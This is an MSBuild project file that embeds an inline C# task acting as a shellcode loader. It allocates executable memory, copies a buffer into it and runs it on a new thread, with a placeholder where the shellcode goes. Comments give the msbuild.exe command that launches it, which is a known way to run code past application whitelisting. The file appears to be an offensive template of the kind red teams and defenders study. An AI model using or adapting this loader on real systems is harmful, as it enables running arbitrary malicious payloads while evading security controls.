<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            !INSERTCODEHERE!
              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>